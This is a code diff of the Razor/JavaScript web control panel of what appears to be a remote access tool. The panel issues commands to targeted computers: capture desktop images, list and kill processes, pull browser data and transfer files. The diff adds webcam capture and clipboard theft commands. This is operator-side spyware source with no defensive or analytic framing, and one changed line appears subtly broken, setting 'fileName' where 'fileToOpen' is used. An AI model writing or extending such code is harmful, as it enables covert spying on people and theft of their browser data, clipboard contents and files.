@@ -30,9 +30,11 @@
                 <select id="command" class="form-control">
                     <option value="@Library.ECommand.DO_NOTHING">Do nothing</option>
                     <option value="@Library.ECommand.UPLOAD_IMAGE">Get desktop image</option>
+                    <option value="@Library.ECommand.UPLOAD_WEBCAM_IMAGE">Get webcam image</option>
                     <option value="@Library.ECommand.UPLOAD_PROCESS_INFO">Get processes</option>
                     <option value="@Library.ECommand.KILL_PROCESS">Kill Process</option>
                     <option value="@Library.ECommand.UPLOAD_PORT_INFO">Get port info</option>
+                    <option value="@Library.ECommand.UPLOAD_CLIPBOARD_DATA">Get Clipboard data</option>
                     <option value="@Library.ECommand.UPLOAD_BROWSER_DATA">Get browser data</option>
                     @*<option value="@Library.ECommand.DOWNLOAD_FILE">Upload a file</option>*@
                     <option value="@Library.ECommand.UPLOAD_FILE">Download a file</option>
@@ -50,7 +52,6 @@
             <div class="form-group">
                 <label for="FileName">File</label>
                 <input type="text" class="form-control" name="FileName" id="FileName" />
-                @*<span id="subCommand"></span>*@
             </div>
 
             <div class="form-group">
@@ -74,9 +75,6 @@
 <ul id="images"></ul>
 
 <script>
-    //var fileToUpload = '';
-    //var fileToDownload = '';
-    //var imageQuality = 20;
     var cursorX = 0;
     var cursorY = 0;
     var computerList = {};
@@ -176,6 +174,7 @@
             //});
         });
     }
+    var fileToOpen = "";
     function editSettings(command, file, parameters, cursorX, cursorY, keyCode) {
         var data = {
             'ComputerHash': computerHash,
@@ -193,7 +192,11 @@
             console.log("result: " + result);
             switch (command) {
                 case '@Library.ECommand.UPLOAD_IMAGE':
-                    updateImage();
+                    //updateImage();
+                    fileToOpen = "desktop.jpg";
+                    break;
+                case '@Library.ECommand.UPLOAD_WEBCAM_IMAGE':
+                    fileToOpen = "webcam.jpg";
                     break;
                 case '@Library.ECommand.STREAM_DESKTOP':
                     startStreamImage(parameters);
@@ -202,7 +205,8 @@
                     stopStreamImage();
                     break;
                 case '@Library.ECommand.UPLOAD_PORT_INFO':
-                    updatePortInfo();
+                    //updatePortInfo();
+                    fileToOpen = "portinfo.txt";
                     break;
                 case '@Library.ECommand.STREAM_DESKTOP':
                     StartStreamDesktop();
@@ -211,12 +215,18 @@
                     //updateData();
                     break;
                 case '@Library.ECommand.UPLOAD_PROCESS_INFO':
-                    updateProcesses();
+                    //updateProcesses();
+                    fileToOpen = "processes.txt";
                     break;
                 case '@Library.ECommand.UPLOAD_FILE_EVENTS':
-                    updateFileEvents();
+                    //updateFileEvents();
+                    fileName = "fileevents.txt";
                     break;
             }
+            $("#data").html("");
+            setTimeout(function () {
+                $("#data").html("<a target='_blank' href='/Home/GetFile?file=" + fileToOpen + "'>open</a>");
+            }, 7000);
         }, "json");
         //.fail(function (data) {
         //    console.log('failed');
